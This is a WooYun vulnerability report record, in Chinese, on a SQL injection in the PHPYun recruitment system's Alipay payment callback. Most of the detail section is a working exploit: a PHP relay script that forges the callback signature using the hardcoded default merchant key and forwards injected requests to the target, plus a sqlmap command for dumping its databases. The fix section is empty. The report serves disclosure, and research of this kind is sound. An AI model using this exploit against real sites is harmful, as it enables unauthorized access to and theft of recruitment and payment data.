{"id": 5940, "wybug_id": "wooyun-2013-043636", "wybug_title": "php云人才系统 UC API 未初始化注入漏洞", "wybug_corp": "php云人才系统", "wybug_author": "Matt", "wybug_date": "2013-11-21 20:13", "wybug_open_date": "2014-02-19 20:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-19：\t细节向公众公开  简要描述：  详细说明：  api/alipaydual/notify_url.phprequire_once(\"alipay.config.php\");require_once(\"lib/alipay_notify.class.php\");require_once(dirname(dirname(dirname(__FILE__))).\"/data/db.config.php\");require_once(dirname(dirname(dirname(__FILE__))).\"/include/mysql.class.php\");$db = new mysql($db_config['dbhost'], $db_config['dbuser'], $db_config['dbpass'], $db_config['dbname'], ALL_PS, $db_config['charset']);//计算得出通知验证结果$alipayNotify = new AlipayNotify($aliapy_config);$verify_result = $alipayNotify->verifyNotify();//有一处验证 验证可以绕过if($verify_result) {//验证成功echo 222;\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\t//请在这里加上商户的业务逻辑程序代\t//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——    //获取支付宝的通知返回参数，可参考技术文档中服务器异步通知参数列表    $out_trade_no\t= $_POST['out_trade_no'];\t    //获取订单号    $trade_no\t\t= $_POST['trade_no'];\t    \t//获取支付宝交易号    $total\t\t\t= $_POST['price'];\t\t\t\t//获取总价格\t$sql=$db->query(\"select * from `\".$db_config[\"def\"].\"company_order` where `order_id`='$out_trade_no'\");//这里进行了注入\techo \"select * from `\".$db_config[\"def\"].\"company_order` where `order_id`='$out_trade_no'\";    $row=mysql_fetch_array($sql);\t$sOld_trade_status = $row['order_state'];\tif($_POST['trade_status'] == 'WAIT_BUYER_PAY') {验证代码：function verifyNotify(){\t\tif(empty($_POST)) {//判断POST来的数组是否为空\t\t\treturn false;\t\t}\t\telse {\t\t\t//生成签名结果\t\t\t$mysign = $this->getMysign($_POST);//这里会产生一个KEY 我们跟一下\t\t\techo $mysign.\"||\";\tfunction getMysign($para_temp) {\t\t//除去待签名参数数组中的空值和签名参数\t\t$para_filter = paraFilter($para_temp); \t\t//对待签名参数数组排序\t\t$para_sort = argSort($para_filter); \t\t//生成签名结果 \t\techo trim($this->aliapy_config['key']).\"::\". strtoupper(trim($this->aliapy_config['sign_type'])).\":x:\";\t\t$mysign = buildMysign($para_sort, trim($this->aliapy_config['key']), strtoupper(trim($this->aliapy_config['sign_type'])));//可以看到这里有利用一个KEY 进行加密 这个KEY是有默认值的 我们可以构造一个中转来生产一个KEY进行注入！ \t\treturn $mysign;\t}   漏洞证明：  中转程序如下================================================================================<?phpfunction paraFilter($para) {\t$para_filter = array();\twhile (list ($key, $val) = each ($para)) {\t\tif($key == \"sign\" || $key == \"sign_type\" || $val == \"\")continue;\t\telse\t$para_filter[$key] = $para[$key];\t}\treturn $para_filter;}function argSort($para) {\tksort($para);\treset($para);\treturn $para;}function createLinkstring($para) {\t$arg  = \"\";\twhile (list ($key, $val) = each ($para)) {\t\t$arg.=$key.\"=\".$val.\"&\";\t}\t//去掉最后一个&字符\t$arg = substr($arg,0,count($arg)-2); \t//如果存在转义字符，那么去掉转义\tif(get_magic_quotes_gpc()){$arg = stripslashes($arg);} \treturn $arg;}function sign($prestr,$sign_type='MD5') {\t$sign='';\tif($sign_type == 'MD5') {\t\t$sign = md5($prestr);\t}elseif($sign_type =='DSA') {\t\t//DSA 签名方法待后续开发\t\tdie(\"DSA 签名方法待后续开发，请先使用MD5签名方式\");\t}else {\t\tdie(\"支付宝暂不支持\".$sign_type.\"类型的签名方式\");\t}\treturn $sign;}function buildMysign($sort_para,$key,$sign_type = \"MD5\") {\t//把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串\t$prestr = createLinkstring($sort_para);\t//把拼接后的字符串再与安全校验码直接连接起来\t$prestr = $prestr.$key;\t//把最终的字符串签名，获得签名结果\t$mysgin = sign($prestr,$sign_type);\treturn $mysgin;}function getMysign($para_temp) {\t\t//除去待签名参数数组中的空值和签名参数\t\t$para_filter = paraFilter($para_temp); \t\t//对待签名参数数组排序\t\t$para_sort = argSort($para_filter); \t\t//生成签名结果\t\t$mysign = buildMysign($para_sort, 'jbjwjnu6zhax0eewc3vfiqldvrg8rnfz', 'MD5'); \t\treturn $mysign;\t}$hash=getMysign($_POST);$host=\"127.0.0.1\";//这里设置下host！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！$data=\"sign={$hash}&out_trade_no={$_POST[out_trade_no]}\";\t$username=rawurlencode(stripslashes($_GET['username']));\t$message = \"POST /yun/api/alipaydual/notify_url.php HTTP/1.1\\r\\n\";//这里记得修改路径！！！！！！！！！！！！！！！！！！！！\t$message .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";\t$message .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\t$message .= \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij\\r\\n\";\t$message .= \"Host: {$host}\\r\\n\";\t$message .= \"Content-Length: \".strlen($data).\"\\r\\n\";\t$message .= \"Connection: close\\r\\n\";\t$message .= \"\\r\\n\";\t$message .=$data;\t//echo $message;\t//file_put_contents('2.txt',$message,FILE_APPEND); //\tprint $message;//\texit();\t$ock=fsockopen($host,80);\tif (!$ock) {\t\techo 'No response from xx!';\t\t//die;\t\treturn '';\t}\tfputs($ock,$message);\twhile ($ock && !feof($ock))\t\t\t$resp .= fread($ock, 1024);\techo $resp;\t?>测试方式sqlmap.py -u \"http://127.0.0.1/x.php\" --data=\"out_trade_no=1\" --dbs就可以了\n\n   修复方案：     版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-21 20:21 厂商回复： 我们会及时修复，感谢您的提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-20 11:23 |    \t\tTASS_傅奎 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:5        | Leander)\t\t \n  技术可以啊！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}